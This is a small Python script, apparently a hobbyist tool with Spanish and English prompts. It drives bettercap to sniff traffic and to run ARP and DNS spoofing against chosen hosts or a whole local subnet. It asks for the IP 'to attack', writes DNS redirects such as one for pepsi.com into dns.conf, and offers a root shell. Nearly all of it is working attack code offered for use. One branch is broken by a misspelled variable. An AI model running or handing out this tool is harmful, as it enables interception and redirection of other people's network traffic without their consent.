#Spoofer/Sniffer linux
#Coded by Tatuck!
#-------------------------
import os
import sys

print('ES: Hola! recuerda que este programa SOLO funciona en maquinas LINUX!')
print('EN: Hello! Remember! This program ONLY works in LINUX!\n\n')

datos = 'CODED BY  \n'
datos = '\n'
datos += 'Bienvenido!!!\n'
datos += 'EN EL CASO DE QUE NO TE FUNCIONE ALGO PRESIONA LA TECLA 9\n\n'
datos += 'RECUERDA! SI ELIGES TODOS LOS DISPOSITIVOS EL INTERNET PUEDE IR MUY LENTO!!!'
datos += 'ELIGE QUE QUIERES HACER!\n\n'
datos += '[0] Saber la IP de mi gateway!\n'
datos += '[1] Sniff Todos los dispositivos \n'
datos += '[2] Sniff Dispositivo concreto \n'
datos += '[3] Spoof Todos de los dispositivos \n'
datos += '[4] Spoof Dispositivo concreto \n'
datos += '[5] Sniff Y Spoof Todos los dispositivos \n'
datos += '[6] Sniff Y Spoof Dispositivo concreto\n'
datos += '[7] Cambiar REDIRECCIONES PARA EL SPOOF\n'
datos += '[8] Crear REDIRECCIONES PARA EL SPOOF\n'
datos += '[9] Pedir permisos de administrador\n'

print (datos)



eleccion = input("Elige: ")



if eleccion == "1":
	interfaz = input("Cual es tu interfaz de internet? wlan0,eth0... ")

	ipg = input("Cual es la ip de tu gateway? 192.168.1.1 ")
	print('OK')
	os.system("sudo bettercap -I "+interfaz+" -X --gateway "+ipg)
elif eleccion == "0":
	print('COPIA LA IP DEBAJO DE "GATEWAY"')
	os.system("netstat -r -n")
elif eleccion == "2":
	interfaz = input("Cual es tu interfaz de internet? wlan0,eth0... ")
	ipg = input("Cual es la ip de tu gateway? 192.168.1.1 ")
	ip = input("Cual es la IP que quieres atacar? ")
	print('OK')
	os.system("sudo bettercap -I "+interfaz+" -X --gateway "+ipg+" --target "+ip)
elif (eleccion == "3"):
	nterfaz = input("Cual es tu interfaz de internet? wlan0,eth0... ")
	ipg = input("Cual es la ip de tu gateway? 192.168.1.1 ")
	print('OK')
	os.system("sudo bettercap -I "+interfaz+" --gateway "+ipg+" --dns dns.conf")
elif eleccion == "4":
	interfaz = input("Cual es tu interfaz de internet? wlan0,eth0... ")
	ipg = input("Cual es la ip de tu gateway? 192.168.1.1 ")
	ip = input("Cual es la IP que quieres atacar? ")
	print('OK')
	os.system("sudo bettercap -I "+interfaz+" --gateway "+ipg+" --target "+ip+" --dns dns.conf")
elif eleccion == "5":
	interfaz = input("Cual es tu interfaz de internet? wlan0,eth0... ")
	ipg = input("Cual es la ip de tu gateway? 192.168.1.1: ")
	print('OK')
	os.system("sudo bettercap -I "+interfaz+" -X --gateway "+ipg+" --target 192.168.1.1-255 --dns dns.conf")
elif eleccion == "6":
	interfaz = input("Cual es tu interfaz de internet? wlan0,eth0... ")
	ipg = input("Cual es la ip de tu gateway? 192.168.1.1 ")
	ip = input("Cual es la IP que quieres atacar? ")
	print('OK')
	os.system("sudo bettercap -I "+interfaz+" -X --gateway "+ipg+" --target "+ip+" --dns dns.conf")
elif eleccion == "7":
	print('RECUERDA UNA POR LINEA!')
	os.system("mousepad dns.conf")
	
elif eleccion == "8":
	print('RECUERDA UNA POR LINEA!')
	
	
	
	print("Tu IP: ")
	os.system("hostname -I")
	os.system("echo 'localhost	pepsi\.com #REMPLAZA LOCALHOST CON LA IP QUE HA SALIDO EN LA CONSOLA!' >> dns.conf")
	os.system("mousepad dns.conf")
elif eleccion == "9":
	os.system("sudo su")
	
else:
	print("Solo puedes elegir un numero de los de arriba!!! NO PUEDES ELEGIR: '"+ eleccion+"'")

